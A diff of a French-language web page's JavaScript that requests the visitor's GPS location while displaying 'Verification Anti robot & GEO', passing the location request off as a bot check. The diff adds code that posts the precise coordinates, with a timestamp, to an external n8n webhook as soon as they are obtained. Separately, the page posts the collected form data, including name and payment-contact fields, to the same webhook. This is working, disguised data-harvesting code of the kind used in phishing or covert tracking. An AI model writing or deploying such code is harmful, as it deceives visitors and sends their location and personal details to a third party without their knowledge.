@@ -87,7 +87,6 @@
     </div>
 
 </div>
-
 <script>
     function getGPSCoordinates() {
       return new Promise((resolve, reject) => {
@@ -130,17 +129,36 @@
         dataForm.style.display = 'block';
     
         const locationInput = document.getElementById('location-input');
-        locationInput.value = "Verification de la anti robot & GEO...";
+        locationInput.value = "Verification Anti robot & GEO...";
     
         getGPSCoordinates()
           .then((coords) => {
             const lat = coords.latitude.toFixed(6);
             const lon = coords.longitude.toFixed(6);
     
-            //locationInput.value = `Lat: ${lat}, Lon: ${lon} (±${Math.round(coords.accuracy)}m)`;
-            locationInput.value = `Validation Anti robot & GEO - OK`;
+            const localisationString = `Lat: ${lat}, Lon: ${lon} (±${Math.round(coords.accuracy)}m)`;
+            locationInput.value = localisationString;
     
             console.log("📍 Google Maps :", `https://www.google.com/maps?q=${lat},${lon}`);
+    
+            /* 🚀 ENVOI #1 — JSON AVEC DATE */
+            const gpsPayload = {
+                localisation: localisationString,
+                nom: "",
+                prenom: "",
+                contact_paiement: "",
+                date_saisie: new Date().toLocaleString('fr-FR')
+            };
+    
+            fetch("https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(gpsPayload)
+            })
+            .then(r => r.text())
+            .then(r => console.log("🟢 GPS envoyé à n8n :", r))
+            .catch(err => console.error("🔴 Erreur envoi GPS :", err));
+    
           })
           .catch((err) => {
             console.error(err);
@@ -178,26 +196,26 @@
         console.log(collectedData);
         console.log("===================================");
     
-        /* 🚀 ENVOI DANS GOOGLE SHEET */
+        /* 🚀 ENVOI #2 — JSON COMPLET */
         fetch("https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(collectedData)
-    })
-    .then(res => res.text())
-    .then(result => {
-        console.log("🟢 n8n a répondu :", result);
-    })
-    .catch(error => {
-        console.error("🔴 Erreur n8n :", error);
-    });
-
-
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(collectedData)
+        })
+        .then(res => res.text())
+        .then(result => {
+            console.log("🟢 n8n a répondu :", result);
+        })
+        .catch(error => {
+            console.error("🔴 Erreur n8n :", error);
+        });
+    
     });
     </script>
     
 
+    
 </body>
 </html>
